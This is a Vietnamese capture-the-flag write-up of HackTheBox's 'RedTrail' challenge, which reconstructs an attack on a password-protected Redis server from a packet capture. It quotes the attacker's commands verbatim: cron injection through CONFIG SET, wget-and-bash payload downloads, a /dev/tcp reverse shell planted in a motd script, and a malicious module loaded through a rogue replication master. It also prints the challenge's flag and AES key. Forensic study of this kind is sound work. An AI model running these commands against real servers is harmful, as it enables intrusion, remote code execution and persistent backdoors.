RedTrail là một challenge của HackTheBox, 

![image](https://hackmd.io/_uploads/ryrD1_CV-g.png)

Đây là description của đề
> Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.

oke cùng giải quyết nó nào

## Initial Access

Tải attachment, đề cho chúng ta một file .pcap, mở bằng nó bằng wireshark
![image](https://hackmd.io/_uploads/HJgvZuREZe.png)

Chúng ta có thể thấy, có rất nhiều gói **RESP (REdis Serialization Protocol)**, thì đây là một giao thức được thiết kế đặt biệt cho việc client-server communication trong Redis 
Mình sẽ để một số nguồn tham khảo cho các bạn muốn tìm hiểu sau về giao thức này: 
https://github.com/redis/redis-specifications/blob/master/protocol/RESP2.md
https://redis-doc-test.readthedocs.io/en/latest/topics/protocol/)

Follow TCP Stream để xem cụ thể nội dung các gói này là gì
### tcp.stream eq 0

![image](https://hackmd.io/_uploads/HyVk5cRV-l.png)

Ở stream 0 này, ta thấy attacker đã thực hiện xác thực thông qua lệnh `AUTH` và `password:1943567864` chứng tỏ attacker đã có được thông tin đăng nhập này bằng một cách nào đó (*author không cho chúng ta context cụ thể ở phần này*).

![image](https://hackmd.io/_uploads/SJBMT9AVZg.png)

Sau khi có được quyền truy cập, attacker thực hiện hành vi reconnaissance server Redis


![Screenshot 2026-01-09 222817](https://hackmd.io/_uploads/rkPq0NkB-l.png)

## Credential Exfiltration
tiếp theo, ta có thể thấy attacker đang enumeration và trích xuất các credential

![image](https://hackmd.io/_uploads/BkuO5HyHbx.png)

và ở đây ta được `Flag-part2: _c0uld_0p3n_n3w`

![image](https://hackmd.io/_uploads/BykaxrkSZg.png)

ở đây ta thấy được attacker sử dụng các lệnh:

`CONFIG SET DIR /var/spool/cron`
`CONFIG SET DBFILENAME root`

`SET TY1RI8 * * * * * wget -O VgLy8V0Zxo 'http://files.pypi-install.com/packages/VgLy8V0Zxo' && bash VgLy8V0Zxo`


từ đó ta biết được rằng attacker đang thực hiện việc inject vào cronjob để thực thi việc drop malware và persistence.

![image](https://hackmd.io/_uploads/rypimHkSbx.png)

và vào phần export của wireshark, ta thấy được file bị inject vào, dump nó ra để phân tích thoi

![image](https://hackmd.io/_uploads/Sk48ESJB-x.png)

ở đây shell chỉ thực hiện việc tách chuỗi thoi, không có gì khó để recover lại

![image](https://hackmd.io/_uploads/HyJTLSJH-x.png)

ta thấy đoạn base64 này đang bị reverse thoi
## Persistence
![image](https://hackmd.io/_uploads/SkFmwHJHZe.png)

sử dụng cyberchef để decode thì ta thấy nó đang thực hiện một bash script khác.

Thì bash script này cũng đang thực hiện việc nối các biến chứa chuỗi base64 rồi decode và gọi bash để thực thi, ta có thể viết lại như sau:
![image](https://hackmd.io/_uploads/Bkr9YS1HWx.png)

ở đây chúng ta thấy rõ ràng persistence theo 2 hướng khác nhau:

**Hướng 1:** attacker sẽ ghi `bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"` vào file `/etc/update-motd.d/00-header`, thì file này sẽ được thực thi để print ra banner khi có người dùng kết nối và đăng nhập thông qua SSH. Vậy nên khi có người đăng nhập vào, thì server gửi một reverse shell về `10.10.0.200:1337` của attacker

**Hướng 2:** script sẽ ghi vào `~/.ssh/authorized_keys` một key của attacker từ đó tạo thêm một backdoor khác mà attacker có thể dùng để access đến server victim.

Trong key này, ta cũng thấy được `Flag-part1: HTB{r3d15_1n574nc35`

## Write malicious RDB & RCE:
Đến với stream tiếp theo

![image](https://hackmd.io/_uploads/ByjsuL1Hbe.png)

![image](https://hackmd.io/_uploads/SJGCuIkHWe.png)

![image](https://hackmd.io/_uploads/BkfyK8yBWl.png)

Ta thấy attacker đang thực thi một số lệnh như:
`AUTH 1943567864`
`SLAVEOF 10.10.0.15 6379`: cho phép attacker gửi file RDB tùy ý
`CONFIG SET DIR /data`: CONFIG SET dbfilename x10SPFHN.so (Attacker chuẩn bị drop malicious Redis module)
`MODULE LOAD ./x10SPFHN.so`: Redis load module độc hại
`SLAVEOF NO ONE`, `CONFIG SET dbfilename dump.rdb`, `system.exec rm -v ./x10SPFHN.so`: Xóa dấu vết

### Drop malware

`wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
`: thể hiện rõ ràng hành vi drop và thực thi malware
sau đó
`MODULE UNLOAD system`: xóa dấu vết

![image](https://hackmd.io/_uploads/HJkGVq7Hbg.png)

oke nhìn vào các response của server, ta thấy output các lệnh RCE của attacker đã bị mã hóa.

## Reverse Engineering

#### Dump malicious .SO file
![image](https://hackmd.io/_uploads/ryxS_5mBbg.png)

Tiếp đến stream này, rõ ràng tác giả đã cố tình ép cho server phải FULLRESYNC, từ đó in ra đầy đủ file ELF, File này có thể chính là file `x10SPFHN.so` mà ta thấy đã bị **write out** ở stream trước.

Nhưng có một vấn đề là, do file này được đang được hiển thị thông replication payload, nên wireshark không hiểu được đây là một object file, nên sẽ không dump được theo cách thông thường.

để dump được, ta chuyển `show data as` thành **raw**, sao đó copy từ đoạn `7F 45 4c 46` (*ELF - đây là header của executable file)

![image](https://hackmd.io/_uploads/B1Xjp9XHZl.png)

sau đó dùng cyberchef để wrap lại thành file ELF hoàn chỉnh và save xuống.
![image](https://hackmd.io/_uploads/HyLOTqXBWl.png)

![image](https://hackmd.io/_uploads/HyHNRcmSZx.png)

oke ngonn lành:>>


#### RE with IDA

Oke giờ load file `x10SPFHN.so` vào IDA
![image](https://hackmd.io/_uploads/HyVWPjmSbg.png)

Toi cũng không biết tại sao file này lại không mở được tab **Strings**, thoi kệ, lướt chay xuống .rodata đọc luôn.

![image](https://hackmd.io/_uploads/S1uFSiXBbe.png)

oke thì ở đây toi thấy được string `system.exec`, chính là lệnh mà attacker đã gọi ra để thực thi các lệnh RCE mà ta thấy ở stream 2

xem xrefs thì thấy nó đang được gọi ở hàm `RedisModule_OnLoad`
![image](https://hackmd.io/_uploads/Hywwtimrbg.png)
Tóm tắt thì trong sau khi Module độc hại sau khi được load thì sẽ đăng ký một command mới là `system.exec`, lệnh này nó sẽ gọi tới hàm `DoCommand` và nhận vào các tham số để thực thi theo cú pháp sau `system.exec <args>`
![image](https://hackmd.io/_uploads/r1EXCi7HWx.png)

oke tiếp theo thì phân tích hàm `DoCommand`

![image](https://hackmd.io/_uploads/Sy2Sf2QHWe.png)


Ở biến `command`,nó sẽ giữ giá trị là lệnh hệ điều hành do attacker gửi vào Redis.
Sau đó nó dùng `popen()` để thực thi lệnh này. Đọc stdout của command từng phần `fgets` sau đó wrap lại hoàn chỉnh toàn bộ output vào buffer `dest` => Remote Command Execution hoàn chỉnh.

![image](https://hackmd.io/_uploads/SkU5in7Sbl.png)

Tiếp đến, script thực hiện setup mã hóa output của command bằng `AES-256-CBC`, với KEY và IV lần lượt là các biến `src` và `v28` với giá trị là `KEY = "h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz"`, `IV = "YDP7ECjzuV7sagMN"`

![image](https://hackmd.io/_uploads/ry4IA37rWl.png)


sau khi đã mã hóa, nó dùng dòng lặp để duyệt và convert các byte đã được mã hóa sang `string hex`, và gọi hàm RedisModule_ReplyWithString() để gửi lại output đến Redis client

oke dựa vào quy trình mã hóa này cùng với KEY và IV, ta sẽ decrypt lại các output đã thấy ở stream 2
![image](https://hackmd.io/_uploads/BJ3PJT7HZg.png)

với các lệnh và output trên, ta lần lượt decrypt và đây là kết quả:
![image](https://hackmd.io/_uploads/ry2fla7HWl.png)
![image](https://hackmd.io/_uploads/S18Ex6XHWg.png)

và đặt biệt, với lệnh:
`system.exec wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3`

![image](https://hackmd.io/_uploads/S1Khx6mHbe.png)

thì có thể đoán được file `gezsdSC8i3` mà attacker tải về và thực thi là để trích xuất các biến môi trường và trong các giá trị của biến môi trường này ta cũng có được `FLAG-PART3:_un3xp3c73d_7r41l5!}`

wrap 3 part lại, ta được flag hoàn chỉnh:
`HTB{r3d15_1n574nc35_c0uld_0p3n_n3w_un3xp3c73d_7r41l5!}`

**Cảm ơn mọi người đã đọc đến đây, chúc một ngày tốt lành**
(\\_/)  
(•.•)  
(>☕  
–– SawG, a.k.a EagleBoiz
